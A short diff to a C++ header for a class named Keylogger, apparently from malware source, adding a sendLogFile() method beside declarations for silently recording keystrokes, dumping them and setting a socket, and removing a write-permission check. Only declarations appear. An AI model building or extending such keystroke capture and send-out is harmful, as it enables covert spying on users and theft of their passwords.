@@ -39,11 +39,10 @@ class Keylogger
         VOID silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile);  //listens to the keystrokes and writes the result to the file.
         
         vector <string> dumpAllData();// Returns all the data from the file that contains the keystrokes. 
+        INT sendLogFile();
         //-----------------------------------------------
         VOID setSocket(SOCKET &sock);
         VOID setPathLogFile();
-        //-----------------------------------------------
-        BOOL iHavePermissionToWrite(); //Test if the program can create the log.txt file. 
         //-----------------------------------------------
         ~Keylogger();
         
